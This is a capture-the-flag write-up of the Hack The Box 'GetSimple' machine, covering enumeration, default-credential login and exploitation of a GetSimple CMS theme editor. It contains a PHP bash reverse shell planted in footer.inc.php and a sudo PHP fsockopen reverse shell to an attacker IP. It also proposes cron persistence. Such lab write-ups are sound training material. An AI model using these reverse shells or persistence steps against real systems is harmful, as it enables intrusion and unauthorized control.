# GetSimple Write-up w/o Metasploit

Hi everyone, This is my first write-up for hack the box platform after completing the "Getting started Module" or "GetSimpe CMS" Machine .

So lets dive in the penetration test process:

## Reconnaissance:

First thing first, since we will use the IP of the target machine in several situations within the terminal, we will assign the IP address to a variable and use it through the remaining tasks:

```bash
export ip=10.129.181.169
```

Next lets scan our target machine to figure out open ports and running services, will start by running nmap tool as follow:

```bash
nmap -sC -sV --open -oA ./scan/inital-$ip $ip
```

- **-sC**: run default nmap scripts.
- **-sV**: start service detection and fingerprinting.
- **--open**: return open ports only.
- **-oA**: save nmap output result (All format: grep-able, text and XML) in the specified path.

```bash
nmap -sC -sV --open -oA ./scan/inital-$ip $ip
```

> Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-10 11:52 EDT
> 
> Nmap scan report for gettingstarted.htb (10.129.181.169)
> 
> Host is up (0.093s latency).
> 
> Not shown: 835 closed tcp ports (conn-refused), 163 filtered tcp ports (no-response)
> 
> Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
> 
> PORT STATE SERVICE VERSION
> 
> 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
> 
> | ssh-hostkey:
> 
> | 3072 4c73a025f5fe817b822b3649a54dc85e (RSA)
> 
> | 256 e1c056d052042f3cac9ae7b1792bbb13 (ECDSA)
> 
> |_ 256 523147140dc38e1573e3c424a23a1277 (ED25519)
> 
> 80/tcp open http Apache httpd 2.4.41 ((Ubuntu))
> 
> | http-robots.txt: 1 disallowed entry
> 
> |_/admin/
> 
> |_http-title: Welcome to GetSimple! - gettingstarted
> 
> |_http-server-header: Apache/2.4.41 (Ubuntu)
> 
> Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
> 
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> 
> Nmap done: 1 IP address (1 host up) scanned in 13.97 seconds
> 
> scanned in 13.97 seconds

From nmap output we found that two ports were being opened as follow:

- **Port 80**: which runs **Apache/2.4.41**
- **Port 22**: which runs **OpenSSH 8.2p1 Ubuntu** ,This version matches OpenSSH 1.8.2p1.

Before start investigating port 80, lets run more comprehensive nmap scan in the background to make sure we cover all bases.
Lets run nmap scan on all ports as follow:

```bash
nmap -sV -sC -p- -oA ./scan/full-$ip $ip
```

After running this scan, we have got the same result as previous one, This confirm that we didn't miss any ports.

* * *

## Enumeration:

Since we have port 80 opened on the target machine and running Apache web server,lets start by identifying the technologies used by this website such as "programming language,content management system(CMS),blogging platforms,Java script libraries, web servers and others".

To identify these technologies, will run the following command:

```bash
whatweb $ip
```

> http://10.129.181.169 \[200 OK\] AddThis, Apache\[2.4.41\], Country\[RESERVED\]\[ZZ\], HTML5, HTTPServer\[Ubuntu Linux\]\[Apache/2.4.41 (Ubuntu)\], IP\[10.129.181.169\], Script\[text/javascript\], Title\[Welcome to GetSimple! - gettingstarted\]

From the previous nmap scan output, we found interesting information "==http-robots.txt: 1 disallowed entry==", as this file could reveals sensitive information or hidden files and directories path, it's being used by developers to prevent search engines from crawling those files and directories and indexing them within their databases.

So, to confirm existing of this file and see its contents if exist, lets run the following command:

```bash
curl -s $ip/robots.txt
```

> User-agent: *
> 
> Disallow: /admin/

Mmmm interesting, we found a hidden directory with admin name, before investigating it lets head over to the web site and navigate its pages as follow:

![home.png](../_resources/home.png)

Moving around all aspects of the page and try to find any interesting information , we found a [Download Latest GetSimple](http://get-simple.info/download "Download GetSimple CMS") link exist on the right side of the page which redirected us to GetSimple CMS Download page,in which we can download the latest version 3.3.16 or previous versions.

This is very interesting information for two reasons:

1.  This is an open source CMS.
2.  we may find discovered and exploited vulnerabilities available for our target if it running "GetSimple CMS" version below 3.3.16 as stated [here](https://github.com/GetSimpleCMS/GetSimpleCMS/releases).

Next, Lets brute force our target website to find any hidden files and directories.

```
gobuster dir -u $ip -w /usr/share/wordlists/dirb/common.txt -o ./scan/gobuster.log
```

- **dir**: for directory brute forcing
- **-u**: for url
- **-w**: for word list file path
- **-o** : save output to path

> ===============================================================
> 
> Gobuster v3.5
> 
> by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
> 
> ===============================================================
> 
> \[+\] Url: http://10.129.181.169
> 
> \[+\] Method: GET
> 
> \[+\] Threads: 10
> 
> \[+\] Wordlist: /usr/share/wordlists/dirb/common.txt
> 
> \[+\] Negative Status codes: 404
> 
> \[+\] User Agent: gobuster/3.5
> 
> \[+\] Timeout: 10s
> 
> ===============================================================
> 
> 2023/06/10 11:57:34 Starting gobuster in directory enumeration mode
> 
> ===============================================================
> 
> /.htaccess (Status: 403) \[Size: 279\]
> 
> /.hta (Status: 403) \[Size: 279\]
> 
> /.htpasswd (Status: 403) \[Size: 279\]
> 
> /admin (Status: 301) \[Size: 316\] \[--> \[[http://10.129.181.169/admin/\](http://10.129.181.169/admin/%5C)\]([http://10.129.181.169/admin/\](http://10.129.181.169/admin/%5C))\]
> 
> /backups (Status: 301) \[Size: 318\] \[--> \[[http://10.129.181.169/backups/\](http://10.129.181.169/backups/%5C)\]([http://10.129.181.169/backups/\](http://10.129.181.169/backups/%5C))\]
> 
> /data (Status: 301) \[Size: 315\] \[--> \[[http://10.129.181.169/data/\](http://10.129.181.169/data/%5C)\]([http://10.129.181.169/data/\](http://10.129.181.169/data/%5C))\]
> 
> /index.php (Status: 200) \[Size: 5487\]
> 
> /plugins (Status: 301) \[Size: 318\] \[--> \[[http://10.129.181.169/plugins/\](http://10.129.181.169/plugins/%5C)\]([http://10.129.181.169/plugins/\](http://10.129.181.169/plugins/%5C))\]
> 
> /robots.txt (Status: 200) \[Size: 32\]
> 
> /server-status (Status: 403) \[Size: 279\]
> 
> /sitemap.xml (Status: 200) \[Size: 431\]
> 
> /theme (Status: 301) \[Size: 316\] \[--> \[[http://10.129.181.169/theme/\](http://10.129.181.169/theme/%5C)\]([http://10.129.181.169/theme/\](http://10.129.181.169/theme/%5C))\]
> 
> Progress: 4614 / 4615 (99.98%)

We found few paths that are interesting: data,backups and admin. so lets head over to the following path: http://10.129.181.169/admin/ (Default port 80)

![admin.png](../_resources/admin.png)

Next, let try few default credentials ("admin/admin","root/root") before brute forcing the login page and hence we luckily found one ("admin/admin").

![pages.png](../_resources/pages.png)

From the login page, we have noticed that the version of the CMS is 3.3.15. So it may be vulnerable and this vulnerability may be publicly discovered and exploited.

> Note: You can also get the version of the CMS before logging in by surfing the following path:
> 
> http://10.129.181.169/data/other/anonymous_data.xml
> 
> &lt;?xml version="1.0"?&gt;
> 
> &lt;data&gt;
> 
> &lt;submission\_date&gt;2023-06-10T15:32:54+00:00&lt;/submission\_date&gt;
> 
> &lt;getsimple_version&gt;==3.3.15==&lt;/getsimple_version&gt;
> 
> &lt;language&gt;en_US&lt;/language&gt;
> 
> &lt;timezone/&gt;
> 
> &lt;php\_version&gt;7.4.3&lt;/php\_version&gt;
> 
> &lt;server\_type&gt;Linux&lt;/server\_type&gt;
> 
> &lt;modules\_missing&gt;\[\]&lt;/modules\_missing&gt;
> 
> &lt;number\_pages&gt;1&lt;/number\_pages&gt;
> 
> &lt;number\_plugins&gt;2&lt;/number\_plugins&gt;
> 
> &lt;number\_files&gt;2&lt;/number\_files&gt;
> 
> &lt;number\_themes&gt;2&lt;/number\_themes&gt;
> 
> &lt;number\_backups&gt;0&lt;/number\_backups&gt;
> 
> &lt;number\_users&gt;0&lt;/number\_users&gt;
> 
> &lt;domain\_tld&gt;htb&lt;/domain\_tld&gt;
> 
> &lt;install\_date&gt;01-01-1970&lt;/install\_date&gt;
> 
> &lt;category&gt;Business&lt;/category&gt;
> 
> &lt;link\_back&gt;yes&lt;/link\_back&gt;
> 
> &lt;/data&gt;

Googling the product name and version, we found that its subjected to the following vulnerabilities:

- [CVE-2019-11231](https://vulmon.com/vulnerabilitydetails?qid=CVE-2019-11231&scoretype=cvssv3) : insufficient input sanitation in the theme-edit.php file allows upload of files with arbitrary content (PHP code, for example)
- [Unauthenticated Remote Code Execution](https://www.exploit-db.com/exploits/46880): allowing an unauthenticated attacker to perform remote code execution, authentication can be bypassed by leaking the CMS API key to target the session manager.

> Note: API key can be found within the following path:
> 
> http://10.129.181.169/data/other/authorization.xml
> 
> This can be confirmed by the following command:
> 
> curl -s http://10.129.181.169/data/other/authorization.xml | xmllint --format -
> 
> *?xml version="1.0" encoding="UTF-8"?>*
> 
> *&lt;item&gt;*
> 
> *&lt;apikey&gt;<!\[CDATA\[==**4f399dc72ff8e619e327800f851e9986**==\]\]>&lt;/apikey&gt;*
> 
> *&lt;/item&gt;*

After finding the details of the existing code execution vulnerability and navigate through all tabs of the login page, we found our code execution vulnerability in the Theme tab / Theme Editor.

![shell.png](../_resources/shell.png)

## Gaining a Foothold:

Now that we have found our target's vulnerable page, lets start getting a reverse shell by appending our PHP reverse_shell code to the **footer.inc.php** page as in the picture above.

```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.14.43/4444 0>&1'")?>
```

Running our **netcat** listener on port **4444** as follow:

```
nc -nvlp 4444
```

> listening on \[any\] 4444 ...
> 
> connect to \[10.10.14.43\] from (UNKNOWN) \[10.129.181.169\] 36042
> 
> bash: cannot set terminal process group (1008): Inappropriate ioctl for device
> 
> bash: no job control in this shell
> 
> www-data@gettingstarted:/var/www/html$

Now,trying to get the flag within the user.txt file located in the user's home directory as follow:

> www-data@gettingstarted:/var/www/html$ ls -l /home/
> 
> total 4
> 
> drwxr-xr-x 3 mrb3n mrb3n 4096 May 7 2021 mrb3n
> 
> www-data@gettingstarted:/var/www/html$ ls -l /home/mrb3n/
> 
> total 4
> 
> -rw-rw-r-- 1 mrb3n mrb3n 33 Feb 16 2021 user.txt
> 
> www-data@gettingstarted:/var/www/html$ cat /home/mrb3n/user.txt
> 
> 70xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

## Privilege Escalation:

Now that we have successfully gained a foothold on our target machine with limited user privilege, we will try to escalate our privilege and getting a root privilege.

To do that, we will first trying to find if we have sudo privilege associated with our logged in user as follow:

```bash
sudo -l
```

> www-data@gettingstarted:/var/www/html$ sudo -l
> 
> Matching Defaults entries for www-data on gettingstarted:
> 
> env\_reset, mail\_badpass,
> 
> secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin
> 
> User www-data may run the following commands on gettingstarted:
> 
> (ALL : ALL) NOPASSWD: /usr/bin/php

Awesome, as mentioned above we were being able to run PHP binary command as root, so lets try that:

```bash
/usr/bin/php -r 'system("/bin/bash");'
/usr/bin/php -r 'system("/bin/sh");'
```

 Unfortunately this doesn't work, so lets try getting a reverse shell using PHP binary:

First: we will run a necat listener on port 4443 as follow:

```
nc -nvlp 4443
```

Next: Lets start a reverse PHP shell as follow:

```
sudo /usr/bin/php -r 'php -r '$sock=fsockopen("10.10.14.43",4443);exec("/bin/sh -i <&3 >&3 2>&3");'
```

> listening on \[any\] 4443 ...
> 
> /connect to \[10.10.14.43\] from (UNKNOWN) \[10.129.181.169\] 38058
> 
> \# ls
> 
> /bin/sh: 1: /ls: not found
> 
> \# bash
> 
> ls
> 
> LICENSE.txt
> 
> admin
> 
> backups
> 
> data
> 
> gsconfig.php
> 
> index.php
> 
> plugins
> 
> readme.txt
> 
> robots.txt
> 
> sitemap.xml
> 
> theme

Lets try upgrading our TTY as follow:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

> root@gettingstarted:/var/www/html# ls -l
> 
> total 80
> 
> -rw-r--r-- 1 www-data www-data 35147 Sep 7 2018 LICENSE.txt
> 
> drwxr-xr-x 5 www-data www-data 4096 Feb 9 2021 admin
> 
> drwxr-xr-x 6 www-data www-data 4096 Feb 9 2021 backups
> 
> drwxr-xr-x 8 www-data www-data 4096 Feb 9 2021 data
> 
> -rw-r--r-- 1 www-data www-data 4165 Feb 9 2021 gsconfig.php
> 
> -rw-r--r-- 1 www-data www-data 3709 Sep 7 2018 index.php
> 
> drwxr-xr-x 4 www-data www-data 4096 Sep 7 2018 plugins
> 
> -rw-r--r-- 1 www-data www-data 1958 Sep 7 2018 readme.txt
> 
> -rw-r--r-- 1 www-data www-data 32 Sep 7 2018 robots.txt
> 
> -rwxr-xr-x 1 www-data www-data 431 Jun 10 15:34 sitemap.xml
> 
> drwxr-xr-x 4 www-data www-data 4096 Feb 9 2021 theme
> 
> root@gettingstarted:/var/www/html# cd ~
> 
> root@gettingstarted:~# ls -l
> 
> total 8
> 
> -rw-r--r-- 1 root root 33 Feb 16 2021 root.txt
> 
> drwxr-xr-x 3 root root 4096 Feb 9 2021 snap

And that's it, we got the root flag.

Next: we can create a cron job and get a persistent foothold for later use.

Finally: there is another easy way to exploit the target machine using Metasploit framework but this is out of scope of this write-up.so if you would like to try it on your own, try these exploits:

- **get\_simple\_cms\_upload\_exec**
- **getsimplecms\_unauth\_code_exec**

*Thanks for reading and hope you've been enjoyed:)*